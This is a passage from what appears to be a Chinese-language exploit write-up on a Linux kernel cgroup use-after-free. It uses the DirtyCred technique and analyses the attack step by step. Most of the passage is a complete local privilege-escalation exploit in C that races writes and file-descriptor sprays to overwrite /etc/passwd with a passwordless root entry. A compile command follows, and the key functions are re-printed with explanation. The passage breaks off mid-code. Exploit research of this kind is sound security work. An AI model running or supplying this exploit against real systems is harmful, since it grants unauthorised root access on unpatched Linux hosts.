&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">sandbox_common</span><span class="params">()</span> &#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setsid();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">136</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_FSIZE, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_STACK, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">0</span>;</span><br><span class="line">    setrlimit(RLIMIT_CORE, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">256</span>;</span><br><span class="line">    setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="literal">NULL</span>, <span class="string">&quot;/&quot;</span>, <span class="literal">NULL</span>, MS_REC | MS_PRIVATE, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWIPC)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshare(<span class="number">0x02000000</span>)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUTS)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_SYSVSEM)) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *value;</span><br><span class="line">    &#125; <span class="type">sysctl_t</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">sysctl_t</span> sysctls[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/shmmax&quot;</span>, <span class="string">&quot;16777216&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/shmall&quot;</span>, <span class="string">&quot;536870912&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/shmmni&quot;</span>, <span class="string">&quot;1024&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/msgmax&quot;</span>, <span class="string">&quot;8192&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/msgmni&quot;</span>, <span class="string">&quot;1024&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/msgmnb&quot;</span>, <span class="string">&quot;1024&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;/proc/sys/kernel/sem&quot;</span>, <span class="string">&quot;1024 1048576 500 1024&quot;</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(sysctls) / <span class="keyword">sizeof</span>(sysctls[<span class="number">0</span>]); i++)</span><br><span class="line">        write_file(sysctls[i].name, sysctls[i].value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">wait_for_loop</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (waitpid(<span class="number">-1</span>, &amp;status, __WALL) != pid) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> WEXITSTATUS(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">drop_caps</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">user_cap_header_struct</span> <span class="title">cap_hdr</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">user_cap_data_struct</span> <span class="title">cap_data</span>[2] =</span> &#123;&#125;;</span><br><span class="line">    cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;</span><br><span class="line">    cap_hdr.pid = getpid();</span><br><span class="line">    <span class="keyword">if</span> (syscall(SYS_capget, &amp;cap_hdr, &amp;cap_data))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> drop = (<span class="number">1</span> &lt;&lt; CAP_SYS_PTRACE) | (<span class="number">1</span> &lt;&lt; CAP_SYS_NICE);</span><br><span class="line">    cap_data[<span class="number">0</span>].effective &amp;= ~drop;</span><br><span class="line">    cap_data[<span class="number">0</span>].permitted &amp;= ~drop;</span><br><span class="line">    cap_data[<span class="number">0</span>].inheritable &amp;= ~drop;</span><br><span class="line">    <span class="keyword">if</span> (syscall(SYS_capset, &amp;cap_hdr, &amp;cap_data))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> real_uid;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> real_gid;</span><br><span class="line">__attribute__((aligned(<span class="number">64</span> &lt;&lt; <span class="number">10</span>))) <span class="type">static</span> <span class="type">char</span> sandbox_stack[<span class="number">1</span> &lt;&lt; <span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">namespace_sandbox_proc</span><span class="params">()</span> &#123;</span><br><span class="line">    sandbox_common();</span><br><span class="line">    loop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_sandbox_namespace</span><span class="params">()</span> &#123;</span><br><span class="line">    setup_common();</span><br><span class="line">    real_uid = getuid();</span><br><span class="line">    real_gid = getgid();</span><br><span class="line">    mprotect(sandbox_stack, <span class="number">4096</span>, PROT_NONE);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> pid =</span><br><span class="line">            clone(namespace_sandbox_proc, &amp;sandbox_stack[<span class="keyword">sizeof</span>(sandbox_stack) - <span class="number">64</span>],</span><br><span class="line">                  CLONE_NEWUSER | CLONE_NEWPID, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;errno: %d\n&quot;</span>, errno);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ret_status = wait_for_loop(pid);</span><br><span class="line">        <span class="keyword">if</span> (ret_status == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] succeed\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] checking /etc/passwd\n\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] executing command : head -n 5 /etc/passwd\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            system(<span class="string">&quot;head -n 5 /etc/passwd&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write, retry...\n\n&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===========================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_NUM 1000</span></span><br><span class="line"><span class="type">int</span> uaf_fd;</span><br><span class="line"><span class="type">int</span> fds[MAX_FILE_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> run_write = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> run_spray = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *cwd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">slow_write</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] start slow write to get the lock\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span>; offset++) &#123;</span><br><span class="line">        <span class="type">void</span> *r = mmap((<span class="type">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mem = (<span class="type">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[5];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = (offset - <span class="number">1</span>) * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">5</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">write_cmd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1024</span>] = <span class="string">&quot;root::0:0:root:/root:/bin/sh\n\n&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = data, .iov_len = <span class="built_in">strlen</span>(data)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(uaf_fd, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to write\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] overwrite done! It should be after the slow write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spray_files</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_spray) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] got uaf fd %d, start spray....\n&quot;</span>, uaf_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_FILE_NUM; i++) &#123;</span><br><span class="line">        fds[i] = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fds[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open file&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==</span><br><span class="line">            <span class="number">0</span>) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] found, file id %d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">                close(fds[j]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fs_fd = syscall(__NR_fsopen, <span class="string">&quot;cgroup&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fsopen&quot;</span>);</span><br><span class="line">        die(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uaf_fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (uaf_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;failed to open symbolic file\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (syscall(__NR_fsconfig, fs_fd, <span class="number">5</span>, <span class="string">&quot;source&quot;</span>, <span class="number">0</span>, uaf_fd)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fsconfig&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// free the uaf fd</span></span><br><span class="line">    close(fs_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">    trigger();</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> p_id;</span><br><span class="line">    pthread_create(&amp;p_id, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> p_id_cmd;</span><br><span class="line">    pthread_create(&amp;p_id_cmd, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(spray_files());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cwd = get_current_dir_name();</span><br><span class="line">    syscall(__NR_mmap, <span class="number">0x1ffff000</span>ul, <span class="number">0x1000</span>ul, <span class="number">0ul</span>, <span class="number">0x32</span>ul, <span class="number">-1</span>, <span class="number">0ul</span>);</span><br><span class="line">    syscall(__NR_mmap, <span class="number">0x20000000</span>ul, <span class="number">0x1000000</span>ul, <span class="number">7ul</span>, <span class="number">0x32</span>ul, <span class="number">-1</span>, <span class="number">0ul</span>);</span><br><span class="line">    syscall(__NR_mmap, <span class="number">0x21000000</span>ul, <span class="number">0x1000</span>ul, <span class="number">0ul</span>, <span class="number">0x32</span>ul, <span class="number">-1</span>, <span class="number">0ul</span>);</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    do_sandbox_namespace();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译命令为 <code>gcc -g exp.c -o exp -static -lpthread</code></p><p>这里我很简单地将 <code>/etc/passwd</code> 的第一项写成 <code>root::0:0:root:/root:/bin/sh\n\n</code>，去掉其中的 <code>x</code> 让它没有密码。</p><img src="/2024/03/13/CVE-2021-4145/1.png" class=""><p>可以发现漏洞是存在的。</p><h3 id="原理概述"><a href="#原理概述" class="headerlink" title="原理概述"></a>原理概述</h3><p>通过阅读 <a href="https://zplin.me/papers/DirtyCred.pdf">论文原文</a> 能大概知道 EXP 的利用思路。</p><img src="/2024/03/13/CVE-2021-4145/2.png" class=""><p>步骤是先打开一个具有写权限的本地文件，对其写入内容，在写文件的时候，内核会检查你的权限，随后再去写，在检查完权限，写之前可以 free 掉这个文件再立马打开特权文件（<code>/etc/passwd</code>），这样就可以达到绕过权限去写特权文件的操作了。</p><p>配合 EXP 来看看</p><h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><p>从 <code>main</code> 函数开始，先调用 3 次 mmap 去分配内存，随后新建了一个 <code>exp_dir</code> 文件夹，并创建了 <code>data</code> 在该文件夹中。</p><h3 id="do-sandbox-namespace"><a href="#do-sandbox-namespace" class="headerlink" title="do_sandbox_namespace"></a>do_sandbox_namespace</h3><p><code>setup_common</code> 函数挂载了一个 FUSE 文件系统，但是测试下来挂载不成功也不影响 EXP 的使用，随后 mprotect 改变内存属性（这里不是很清楚为什么把栈的属性清零）。随后循环</p><p>在循环中调用 <code>clone</code> 去启动一个新的进程，一般来说，<code>clone</code> 理解为 <code>fork</code> 没有问题。随后子进程执行 <code>namespace_sandbox_proc</code>，主进程等待子进程返回，那么来分析分析这个函数。</p><h4 id="sandbox-common"><a href="#sandbox-common" class="headerlink" title="sandbox_common"></a>sandbox_common</h4><p>先设置父进程死亡的信号为 <code>SIGKILL</code>，然后调用 <code>setsid()</code> 去脱离当前终端。随后做了一系列的限制，分别为</p><ul><li>地址空间限制（RLIMIT_AS）：限制了进程的虚拟内存空间大小为 200MB。</li><li>锁定内存限制（RLIMIT_MEMLOCK）：限制了进程锁定内存的大小为 32MB。</li><li>文件大小限制（RLIMIT_FSIZE）：限制了进程可以创建的文件大小为 136MB。</li><li>栈大小限制（RLIMIT_STACK）：限制了进程的栈大小为 1MB。</li><li>核心文件大小限制（RLIMIT_CORE）：禁止了进程生成核心转储文件。</li><li>打开文件描述符数量限制（RLIMIT_NOFILE）：限制了进程可以打开的文件描述符数量为 256。</li></ul><p>然后挂载创建一个新的命名空间，将当前命名空间的根文件系统挂载点设置为私有，再创建其它的一系列的命名空间。</p><p>随后写这些内核参数文件，这样就创建了一个合适的环境。</p><h4 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h4><h5 id="trigger"><a href="#trigger" class="headerlink" title="trigger"></a>trigger</h5><p><code>fsopen</code> 打开一个文件系统 <code>cgroup</code>，将 <code>./uaf</code> 链接到 <code>./data</code> 上，又使用 <code>fsconfig</code> 进行了一些配置，在这个地方已经产生了 UAF 漏洞。</p><p>然后开启了两个线程分别启动 <code>slow_write</code> 和 <code>write_cmd</code>，主线程调用 <code>spray_files</code>。分别对应论文第一张图的线程 1，2，3。</p><p>那么可以发现，主要就是由这三个线程去操作了，之前一系列是为了进行一个环境配置在造成 UAF，因为并没有权限直接更改内核的某些参数，所以直接创建新的命名空间去操作的。</p><h5 id="slow-write"><a href="#slow-write" class="headerlink" title="slow_write"></a>slow_write</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">slow_write</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] start slow write to get the lock\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span>; offset++) &#123;</span><br><span class="line">        <span class="type">void</span> *r = mmap((<span class="type">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mem = (<span class="type">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[5];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = (offset - <span class="number">1</span>) * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">5</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开文件去占据内核锁，去打开 <code>./uaf</code>，至于为什么打开 uaf，稍后分析内核源码可以获得具体原因。</p><p>这里面还分配了大量内存页，并尝试将所有页面写入文件，这一步通过文献的查阅可以得知是为了减缓写文件的速度，把写文件的时间线拉长就可以提高漏洞利用的成功率。</p><p>中间在开始写之前会设置一个全局变量去启动下一个线程。</p><h4 id="write-cmd"><a href="#write-cmd" class="headerlink" title="write_cmd"></a>write_cmd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">write_cmd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1024</span>] = <span class="string">&quot;root::0:0:root:/root:/bin/sh\n\n&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = data, .iov_len = <span class="built_in">strlen</span>(data)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(uaf_fd, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to write\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] overwrite done! It should be after the slow write\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步就是等到第一个线程调用 <code>writev</code> 的时候启动第三个线程，然后再去写指定的数据。</p><h4 id="spray-files"><a href="#spray-files" class="headerlink" title="spray_files"></a>spray_files</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">spray_files</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_spray) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] got uaf fd %d, start spray....\n&quot;</span>, uaf_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_FILE_NUM; i++) &#123;</span><br><span class="line">        fds[i] = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fds[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open file&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 